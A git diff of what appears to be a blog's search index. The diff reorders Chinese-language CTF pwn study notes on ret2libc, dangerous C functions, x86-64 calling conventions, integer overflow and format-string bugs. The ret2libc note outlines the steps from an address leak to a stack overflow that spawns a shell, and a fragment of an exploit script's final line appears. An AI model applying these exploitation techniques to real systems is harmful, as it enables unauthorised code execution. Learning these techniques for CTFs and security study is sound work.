+r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/img/image-20210425165227769.png"></p>
+<p>虽然这种方法应该不是最正确的做法，但我觉得这方法挺聪明，正规的做法需要通过mprotect函数修改bss段的权限，然后传入shellcode，但我能力有限，暂时还不会</p>
 ]]></content>
       <categories>
         <category>writeup</category>
@@ -1201,6 +1201,36 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
       </tags>
   </entry>
   <entry>
+    <title>ret2libc</title>
+    <url>/2021/06/20/ret2libc/</url>
+    <content><![CDATA[<span id="more"></span>
+<h1 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h1><p>libc是Linux下的ANSIC的函数库。</p>
+<p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。</p>
+<h3 id="非执行堆栈"><a href="#非执行堆栈" class="headerlink" title="非执行堆栈"></a>非执行堆栈</h3><p>非执行堆栈是为避免堆或者堆栈的内存区域被植入恶意代码执行，当然也可以直接防止一部分内存被写入恶意代码。换句话说，这是个防止缓冲区溢出的功能。</p>
+<p>当checksec发现NX(No-eXecute)开启后，其实就已经是非执行堆栈了，这时候就需要用到libc库。</p>
+<h5 id="libc是怎么来的：不再用指令覆盖EIP，直接调用libc库中我们需要的函数覆盖"><a href="#libc是怎么来的：不再用指令覆盖EIP，直接调用libc库中我们需要的函数覆盖" class="headerlink" title="libc是怎么来的：不再用指令覆盖EIP，直接调用libc库中我们需要的函数覆盖"></a>libc是怎么来的：不再用指令覆盖EIP，直接调用libc库中我们需要的函数覆盖</h5><p>思路：</p>
+<p>1.泄露 一个调用函数的 地址</p>
+<p>2.获取 libc 版本</p>
+<p>3.获取 system 地址与 /bin/sh 的地址</p>
+<p>4.再次执行源程序</p>
+<p>5.触发栈溢出执行 system(‘/bin/sh’)</p>
+<p>shellcode结构：</p>
+<p><img src="/img/shellcode.png"></p>
+<p>正常堆栈布局：</p>
+<p><img src="/img/1.png"></p>
+<p>ret2libc执行system的堆栈布局：</p>
+<p><img src="/img/2.png"></p>
+<p>具体例题可以查看[OGeek2019]babyrop的writeup。</p>
+<p>平常的shellcode在源程序里就能找到system函数和/bin/sh，而ret2libc类型的题差别就在这里，我们需要通过libc库查找到system函数和/bin/sh在源程序中的位置，然后才能构造shellcode进行夺权，最后拿下flag。</p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>pwn2_sctf_2016</title>
     <url>/2021/07/06/pwn2-sctf-2016/</url>
     <content><![CDATA[<h1 id="pwn2-sctf-2016"><a href="#pwn2-sctf-2016" class="headerlink" title="pwn2_sctf_2016"></a>pwn2_sctf_2016</h1><p>检查保护机制，开了NX,32位</p>
@@ -1285,36 +1315,6 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
       </tags>
   </entry>
   <entry>
-    <title>ret2libc</title>
-    <url>/2021/06/20/ret2libc/</url>
-    <content><![CDATA[<span id="more"></span>
-<h1 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h1><p>libc是Linux下的ANSIC的函数库。</p>
-<p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。</p>
-<h3 id="非执行堆栈"><a href="#非执行堆栈" class="headerlink" title="非执行堆栈"></a>非执行堆栈</h3><p>非执行堆栈是为避免堆或者堆栈的内存区域被植入恶意代码执行，当然也可以直接防止一部分内存被写入恶意代码。换句话说，这是个防止缓冲区溢出的功能。</p>
-<p>当checksec发现NX(No-eXecute)开启后，其实就已经是非执行堆栈了，这时候就需要用到libc库。</p>
-<h5 id="libc是怎么来的：不再用指令覆盖EIP，直接调用libc库中我们需要的函数覆盖"><a href="#libc是怎么来的：不再用指令覆盖EIP，直接调用libc库中我们需要的函数覆盖" class="headerlink" title="libc是怎么来的：不再用指令覆盖EIP，直接调用libc库中我们需要的函数覆盖"></a>libc是怎么来的：不再用指令覆盖EIP，直接调用libc库中我们需要的函数覆盖</h5><p>思路：</p>
-<p>1.泄露 一个调用函数的 地址</p>
-<p>2.获取 libc 版本</p>
-<p>3.获取 system 地址与 /bin/sh 的地址</p>
-<p>4.再次执行源程序</p>
-<p>5.触发栈溢出执行 system(‘/bin/sh’)</p>
-<p>shellcode结构：</p>
-<p><img src="/img/shellcode.png"></p>
-<p>正常堆栈布局：</p>
-<p><img src="/img/1.png"></p>
-<p>ret2libc执行system的堆栈布局：</p>
-<p><img src="/img/2.png"></p>
-<p>具体例题可以查看[OGeek2019]babyrop的writeup。</p>
-<p>平常的shellcode在源程序里就能找到system函数和/bin/sh，而ret2libc类型的题差别就在这里，我们需要通过libc库查找到system函数和/bin/sh在源程序中的位置，然后才能构造shellcode进行夺权，最后拿下flag。</p>
-]]></content>
-      <categories>
-        <category>笔记</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>shellcode</title>
     <url>/2021/11/22/shellcode/</url>
     <content><![CDATA[<span id="more"></span>
@@ -1374,53 +1374,6 @@ io.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span>
       </categories>
       <tags>
         <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>一些危险函数和64位寄存器与32位不同之处</title>
-    <url>/2021/06/26/%E4%B8%80%E4%BA%9B%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E5%92%8C64%E4%BD%8D%E5%AF%84%E5%AD%98%E5%99%A8%E4%B8%8E32%E4%BD%8D%E4%B8%8D%E5%90%8C%E4%B9%8B%E5%A4%84/</url>
-    <content><![CDATA[<span id="more"></span>
-<p>列举一下常见的危险函数：</p>
-<h4 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h4><pre><code>    gets，直接读取一行，忽略&#39;\x00&#39;
-    scanf
-    vscanf
-</code></pre>
-<h4 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h4><pre><code>    sprintf
-</code></pre>
-<h4 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h4><pre><code>    strcpy，字符串复制，遇到&#39;\x00&#39;停止
-    strcat，字符串拼接，遇到&#39;\x00&#39;停止
-    copy
-</code></pre>
-<h3 id="64位与32位寄存器区别有："><a href="#64位与32位寄存器区别有：" class="headerlink" title="64位与32位寄存器区别有："></a>64位与32位寄存器区别有：</h3><p>64位有16个寄存器，32位只有8个。但是32位前8个都有不同的命名，分别是e _ ，而64位前8个使用了r代替e，也就是r_。<br>e开头的寄存器命名依然可以直接运用于相应寄存器的低32位。而剩下的寄存器名则是从r8 - r15，其低位分别用d，w,b指定长度。</p>
-<p>32位使用栈帧来作为传递的参数的保存位置，而64位使用寄存器，分别用rdi,rsi,rdx,rcx,r8,r9作为第1-6个参数。rax作为返回值。</p>
-<p>64位没有栈帧的指针，32位用ebp作为栈帧指针，64位取消了这个设定，rbp作为通用寄存器使用。</p>
-<p>64位支持一些形式的以PC相关的寻址，而32位只有在jmp的时候才会用到这种寻址方式。</p>
-<p><img src="/img/64.png"></p>
-<h3 id="过程（函数）调用的不同"><a href="#过程（函数）调用的不同" class="headerlink" title="过程（函数）调用的不同"></a>过程（函数）调用的不同</h3><pre><code>参数通过寄存器传递（见前文）
-callq 在栈里存放一个8位的返回地址
-许多函数不再有栈帧，只有无法将所有本地变量放在寄存器里的才会在栈上分配空间。
-函数可以获取到栈至多128字节的空间。这样函数就可以在不更改栈指针的情况下在栈上存储信息（也就是说，可以提前用rsp以下的128字节空间，这段空间被称为red zone，在x86-64里，时刻可用）
-不再有栈帧指针。现在栈的位置和栈指针相关。大多数函数在调用的一开始就分配全部所需栈空间，之后保持栈指针不改变。
-
-一些寄存器被设计成为被调用者-存储的寄存器。这些必须在需要改变他们值的时候存储他们并且之后恢复他们。
-</code></pre>
-<h3 id="参数传递的不同"><a href="#参数传递的不同" class="headerlink" title="参数传递的不同"></a>参数传递的不同</h3><pre><code>6个寄存器用来传递参数（见前文）
-剩下的寄存器按照之前的方式传递（不过是与rsp相关了，ebp不再作为栈帧指针，并且从rsp开始第7个参数，rsp+8开始第8个，以此类推）
-调用时，rsp向下移动8位（存入返回地址），寄存器参数无影响，第7个及之后的参数现在则是从rsp+8开始第7个，rsp+16开始第8个，以此类推
-</code></pre>
-<h3 id="栈帧的不同"><a href="#栈帧的不同" class="headerlink" title="栈帧的不同"></a>栈帧的不同</h3><p>很多情况下不再需要栈帧，比如在没有调用别的函数，且寄存器足以存储参数，那么就只需要存储返回地址即可。<br>需要栈帧的情况：</p>
-<pre><code>本地变量太多，寄存器不够
-一些本地变量是数组或结构体
-函数使用了取地址操作符来计算一个本地变量的地址
-函数必须用栈传送一些参数给另外一个函数
-函数需要保存一些由被调用者存储的寄存器的状态（以便于恢复）
-</code></pre>
-]]></content>
-      <categories>
-        <category>笔记</category>
-      </categories>
-      <tags>
-        <tag>笔记</tag>
       </tags>
   </entry>
   <entry>
@@ -1866,17 +1819,50 @@ alpha <span class="token operator">=</span> <span class="token number">3.0</span
       </tags>
   </entry>
   <entry>
-    <title>飞蓬大将军</title>
-    <url>/2021/06/17/%E5%8F%88%E6%98%AF%E4%B8%80%E5%B9%B4%E5%A4%8F%E5%A4%A9%EF%BC%8C%E5%8F%88%E6%98%AF%E4%B8%80%E5%B9%B4%E4%BB%99%E5%89%91/</url>
+    <title>一些危险函数和64位寄存器与32位不同之处</title>
+    <url>/2021/06/26/%E4%B8%80%E4%BA%9B%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E5%92%8C64%E4%BD%8D%E5%AF%84%E5%AD%98%E5%99%A8%E4%B8%8E32%E4%BD%8D%E4%B8%8D%E5%90%8C%E4%B9%8B%E5%A4%84/</url>
     <content><![CDATA[<span id="more"></span>
-<h3 id="又是一年夏天，又是一年仙剑"><a href="#又是一年夏天，又是一年仙剑" class="headerlink" title="又是一年夏天，又是一年仙剑"></a>又是一年夏天，又是一年仙剑</h3><p>九叶重楼二两，冬至蝉蛹一钱，加入隔年雪，可医世人相思疾苦，可重楼七叶枝一枝花，冬至何来蝉蛹，雪又怎能隔年，原是相思无解。</p>
-<p>哪来相思无解？九叶重楼可培育，蚕蛹在温室也不是不能活但冬至，今年雪放到冰箱明年用，其实一切都能实现，就是代价更大，说是无解，其是不解而已，忘掉她不如思念她，既见随念。</p>
+<p>列举一下常见的危险函数：</p>
+<h4 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h4><pre><code>    gets，直接读取一行，忽略&#39;\x00&#39;
+    scanf
+    vscanf
+</code></pre>
+<h4 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h4><pre><code>    sprintf
+</code></pre>
+<h4 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h4><pre><code>    strcpy，字符串复制，遇到&#39;\x00&#39;停止
+    strcat，字符串拼接，遇到&#39;\x00&#39;停止
+    copy
+</code></pre>
+<h3 id="64位与32位寄存器区别有："><a href="#64位与32位寄存器区别有：" class="headerlink" title="64位与32位寄存器区别有："></a>64位与32位寄存器区别有：</h3><p>64位有16个寄存器，32位只有8个。但是32位前8个都有不同的命名，分别是e _ ，而64位前8个使用了r代替e，也就是r_。<br>e开头的寄存器命名依然可以直接运用于相应寄存器的低32位。而剩下的寄存器名则是从r8 - r15，其低位分别用d，w,b指定长度。</p>
+<p>32位使用栈帧来作为传递的参数的保存位置，而64位使用寄存器，分别用rdi,rsi,rdx,rcx,r8,r9作为第1-6个参数。rax作为返回值。</p>
+<p>64位没有栈帧的指针，32位用ebp作为栈帧指针，64位取消了这个设定，rbp作为通用寄存器使用。</p>
+<p>64位支持一些形式的以PC相关的寻址，而32位只有在jmp的时候才会用到这种寻址方式。</p>
+<p><img src="/img/64.png"></p>
+<h3 id="过程（函数）调用的不同"><a href="#过程（函数）调用的不同" class="headerlink" title="过程（函数）调用的不同"></a>过程（函数）调用的不同</h3><pre><code>参数通过寄存器传递（见前文）
+callq 在栈里存放一个8位的返回地址
+许多函数不再有栈帧，只有无法将所有本地变量放在寄存器里的才会在栈上分配空间。
+函数可以获取到栈至多128字节的空间。这样函数就可以在不更改栈指针的情况下在栈上存储信息（也就是说，可以提前用rsp以下的128字节空间，这段空间被称为red zone，在x86-64里，时刻可用）
+不再有栈帧指针。现在栈的位置和栈指针相关。大多数函数在调用的一开始就分配全部所需栈空间，之后保持栈指针不改变。
+
+一些寄存器被设计成为被调用者-存储的寄存器。这些必须在需要改变他们值的时候存储他们并且之后恢复他们。
+</code></pre>
+<h3 id="参数传递的不同"><a href="#参数传递的不同" class="headerlink" title="参数传递的不同"></a>参数传递的不同</h3><pre><code>6个寄存器用来传递参数（见前文）
+剩下的寄存器按照之前的方式传递（不过是与rsp相关了，ebp不再作为栈帧指针，并且从rsp开始第7个参数，rsp+8开始第8个，以此类推）
+调用时，rsp向下移动8位（存入返回地址），寄存器参数无影响，第7个及之后的参数现在则是从rsp+8开始第7个，rsp+16开始第8个，以此类推
+</code></pre>
+<h3 id="栈帧的不同"><a href="#栈帧的不同" class="headerlink" title="栈帧的不同"></a>栈帧的不同</h3><p>很多情况下不再需要栈帧，比如在没有调用别的函数，且寄存器足以存储参数，那么就只需要存储返回地址即可。<br>需要栈帧的情况：</p>
+<pre><code>本地变量太多，寄存器不够
+一些本地变量是数组或结构体
+函数使用了取地址操作符来计算一个本地变量的地址
+函数必须用栈传送一些参数给另外一个函数
+函数需要保存一些由被调用者存储的寄存器的状态（以便于恢复）
+</code></pre>
 ]]></content>
       <categories>
-        <category>日常闲话</category>
+        <category>笔记</category>
       </categories>
       <tags>
-        <tag>生活</tag>
+        <tag>笔记</tag>
       </tags>
   </entry>
   <entry>
@@ -1901,6 +1887,20 @@ alpha <span class="token operator">=</span> <span class="token number">3.0</span
       </categories>
       <tags>
         <tag>笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>飞蓬大将军</title>
+    <url>/2021/06/17/%E5%8F%88%E6%98%AF%E4%B8%80%E5%B9%B4%E5%A4%8F%E5%A4%A9%EF%BC%8C%E5%8F%88%E6%98%AF%E4%B8%80%E5%B9%B4%E4%BB%99%E5%89%91/</url>
+    <content><![CDATA[<span id="more"></span>
+<h3 id="又是一年夏天，又是一年仙剑"><a href="#又是一年夏天，又是一年仙剑" class="headerlink" title="又是一年夏天，又是一年仙剑"></a>又是一年夏天，又是一年仙剑</h3><p>九叶重楼二两，冬至蝉蛹一钱，加入隔年雪，可医世人相思疾苦，可重楼七叶枝一枝花，冬至何来蝉蛹，雪又怎能隔年，原是相思无解。</p>
+<p>哪来相思无解？九叶重楼可培育，蚕蛹在温室也不是不能活但冬至，今年雪放到冰箱明年用，其实一切都能实现，就是代价更大，说是无解，其是不解而已，忘掉她不如思念她，既见随念。</p>
+]]></content>
+      <categories>
+        <category>日常闲话</category>
+      </categories>
+      <tags>
+        <tag>生活</tag>
       </tags>
   </entry>
   <entry>
@@ -2389,6 +2389,31 @@ warn_on_root &#x3D; 1
       </tags>
   </entry>
   <entry>
+    <title>整数安全漏洞</title>
+    <url>/2021/07/23/%E6%95%B4%E6%95%B0%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h3 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h3><p>如果一个整数用来计算一些敏感数值，如缓冲区大小或数值索引，就会产生潜在的危险。通常情况下，整数溢出并没有改写额外的内存，不会直接导致任意代码执行，但是它会导致栈溢出和堆溢出，而后两者都会导致任意代码执行。由于整数溢出发生之后，很难立即被察觉，比较难用一个有效的方法去判断是否出现或者可能出现整数溢出。</p>
+<p>关于整数的异常情况主要有三种：<br>(1) 溢出，只有有符号数才会发生溢出。有符号数的最高位表示符号，在两正或两负相加时，有可能改变符号位的值，产生溢出。溢出标指OF可检测有符号数的溢出；<br>(2) 回绕，无符号数0-1时会变成最大的数，如1字节的无符号数会变成255，而255+1会变成最小数0.进位标志CF可检测无符号数的回绕；<br>(3) 截断，将一个较大宽度的数存入一个宽度小的操作数中，高位发生截断</p>
+<h3 id="漏洞多发函数"><a href="#漏洞多发函数" class="headerlink" title="漏洞多发函数"></a>漏洞多发函数</h3><p>整数溢出要配合其他类型的缺陷才能有用，下面的两个函数都有一个size_t类型的参数（size_t是无符号整数类型的sizeof()的结果），常常被误用而产生整数溢出，接着就可能导致缓冲区溢出漏洞。</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#include&lt;string.h></span>
+void <span class="token operator">*</span>memcpy<span class="token punctuation">(</span>void <span class="token operator">*</span>dest<span class="token punctuation">,</span>const void <span class="token operator">*</span>src<span class="token punctuation">,</span>size_t n<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>memcpy()函数将src所指向的字符串中以src地址开始的前n个字节复制到dest所指的数组中，并返回dest。</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#include&lt;string.h></span>
+char <span class="token operator">*</span>strncpy<span class="token punctuation">(</span>char <span class="token operator">*</span>dest<span class="token punctuation">,</span> const char <span class="token operator">*</span>src<span class="token punctuation">,</span>size_t n<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>strncpy()函数从源src所指的内存地址的起始位置开始复制n个字节到目标dest所指的内存地址的起始位置中。</p>
+<p>两个函数中都有一个类型为size_t的参数，它是无符号整型的sizeof运算符的结果。</p>
+<pre><code>typedef unsigned int size_t;    h
+</code></pre>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>笔记</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>格式化字符串漏洞</title>
     <url>/2021/07/18/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<h1 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h1><p>格式化字符串漏洞是<code>PWN</code>题常见的考察点，仅次于栈溢出漏洞。漏洞原因：程序使用了格式化字符串作为参数，并且格式化字符串为用户可控。其中触发格式化字符串漏洞函数主要是<code>printf</code>、<code>sprintf</code>、<code>fprintf</code>、<code>prin</code>等C库中<code>print</code>家族的函数</p>
@@ -2468,31 +2493,6 @@ int main(void)
 
 <p>成功打印出地址</p>
 <h3 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h3><p>对于格式化字符串漏洞的主要利用有：使程序崩溃、栈数据泄露、任意地址内存泄露、栈数据覆盖、任意地址内存覆盖。</p>
-]]></content>
-      <categories>
-        <category>笔记</category>
-      </categories>
-      <tags>
-        <tag>笔记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>整数安全漏洞</title>
-    <url>/2021/07/23/%E6%95%B4%E6%95%B0%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h3 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h3><p>如果一个整数用来计算一些敏感数值，如缓冲区大小或数值索引，就会产生潜在的危险。通常情况下，整数溢出并没有改写额外的内存，不会直接导致任意代码执行，但是它会导致栈溢出和堆溢出，而后两者都会导致任意代码执行。由于整数溢出发生之后，很难立即被察觉，比较难用一个有效的方法去判断是否出现或者可能出现整数溢出。</p>
-<p>关于整数的异常情况主要有三种：<br>(1) 溢出，只有有符号数才会发生溢出。有符号数的最高位表示符号，在两正或两负相加时，有可能改变符号位的值，产生溢出。溢出标指OF可检测有符号数的溢出；<br>(2) 回绕，无符号数0-1时会变成最大的数，如1字节的无符号数会变成255，而255+1会变成最小数0.进位标志CF可检测无符号数的回绕；<br>(3) 截断，将一个较大宽度的数存入一个宽度小的操作数中，高位发生截断</p>
-<h3 id="漏洞多发函数"><a href="#漏洞多发函数" class="headerlink" title="漏洞多发函数"></a>漏洞多发函数</h3><p>整数溢出要配合其他类型的缺陷才能有用，下面的两个函数都有一个size_t类型的参数（size_t是无符号整数类型的sizeof()的结果），常常被误用而产生整数溢出，接着就可能导致缓冲区溢出漏洞。</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#include&lt;string.h></span>
-void <span class="token operator">*</span>memcpy<span class="token punctuation">(</span>void <span class="token operator">*</span>dest<span class="token punctuation">,</span>const void <span class="token operator">*</span>src<span class="token punctuation">,</span>size_t n<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p>memcpy()函数将src所指向的字符串中以src地址开始的前n个字节复制到dest所指的数组中，并返回dest。</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#include&lt;string.h></span>
-char <span class="token operator">*</span>strncpy<span class="token punctuation">(</span>char <span class="token operator">*</span>dest<span class="token punctuation">,</span> const char <span class="token operator">*</span>src<span class="token punctuation">,</span>size_t n<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p>strncpy()函数从源src所指的内存地址的起始位置开始复制n个字节到目标dest所指的内存地址的起始位置中。</p>
-<p>两个函数中都有一个类型为size_t的参数，它是无符号整型的sizeof运算符的结果。</p>
-<pre><code>typedef unsigned int size_t;    h
-</code></pre>
 ]]></content>
       <categories>
         <category>笔记</category>
